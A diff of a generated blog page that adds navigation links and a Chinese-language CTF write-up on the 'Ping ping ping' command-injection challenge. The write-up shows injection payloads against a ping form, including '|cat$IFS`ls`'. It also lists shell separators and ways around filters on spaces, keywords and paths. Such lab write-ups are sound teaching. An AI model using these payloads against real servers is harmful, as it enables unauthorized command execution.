@@ -1791,6 +1791,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -1838,6 +1842,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/htaccess/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    .htaccess
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2238,6 +2272,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../../category/%E5%9B%BE%E7%89%87%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    图片马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../../../category/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-nav__link">
         
   
@@ -2525,6 +2589,82 @@
       <header class="md-typeset">
         <h1 id="2026">2026<a class="headerlink" href="#2026" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-20 00:00:00+00:00">2026-10-20</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../../../category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-meta__link">命令注入</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 1 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="ping-ping-ping-flag"><a class="toclink" href="../../../../ping-ping-ping/">[Ping ping ping] 空格被过滤后怎么读 flag</a></h2>
+<p>第一道命令注入题。输入框是 ping 测试。</p>
+<h3 id="_1"><a class="toclink" href="../../../../ping-ping-ping/#_1">现象</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>127.0.0.1;id      → 没反应
+</span></code></pre></div>
+<p><strong>试出空格被过滤。</strong></p>
+<h3 id="_2"><a class="toclink" href="../../../../ping-ping-ping/#_2">绕法</a></h3>
+<p><strong>空格 → <code>$IFS</code></strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">;</span>ls<span class="w">          </span>→<span class="w"> </span>看见<span class="w"> </span>flag.php
+</span></code></pre></div>
+<p><strong>但 <code>flag</code> 这个词也被过滤，<code>/</code> 和 <code>/f*</code> 同样被拦。</strong></p>
+<h3 id="_3"><a class="toclink" href="../../../../ping-ping-ping/#_3">关键一步：让系统自己算文件名</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">|</span>cat<span class="nv">$IFS</span><span class="sb">`</span>ls<span class="sb">`</span>
+</span></code></pre></div>
+<p><strong>拆开看：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>|            管道
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>cat          要执行的命令
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>$IFS         空格
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>`ls`         命令替换 → 得到 "flag.php"
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>             ↓
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>最终等价于:  cat flag.php
+</span></code></pre></div>
+<p><strong>拿到了 flag。</strong></p>
+<h3 id="_4"><a class="toclink" href="../../../../ping-ping-ping/#_4">为什么这招有效</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>flag 被拦   →  不写 flag 这个字面量
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>/ 和 /f* 被拦 →  路径里的 / 也不用写
+</span></code></pre></div>
+<p><strong>让系统输出文件名，再用命令替换塞进参数里 —— 你一个字都不用写。</strong></p>
+<h3 id="_5"><a class="toclink" href="../../../../ping-ping-ping/#_5">踩的坑</a></h3>
+<div class="admonition bug">
+<p class="admonition-title">全角 ￥ 不是 $</p>
+<p>中文输入法下容易打成 <code>￥IFS</code>，shell 不认。必须半角 <code>$</code>。</p>
+</div>
+<div class="admonition bug">
+<p class="admonition-title">$IFS 后面紧跟字母会粘连</p>
+<p><code>cat$IFS/flag</code> ✅
+<code>cat$IFSflag</code>  ❌ 变成变量 <code>$IFSflag</code></p>
+</div>
+<h3 id="_6"><a class="toclink" href="../../../../ping-ping-ping/#_6">收获</a></h3>
+<blockquote>
+<p><strong>分隔符有五种（<code>;</code> <code>|</code> <code>||</code> <code>&amp;&amp;</code> <code>%0a</code>），别在 <code>;</code> 上吊死。</strong></p>
+<p><strong>关键词被拦 → 引号拆分、通配符、命令替换。</strong></p>
+<p><strong>路径被拦 → <code>`ls`</code> 让系统自己算 —— 这是最通用的一招。</strong></p>
+</blockquote>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
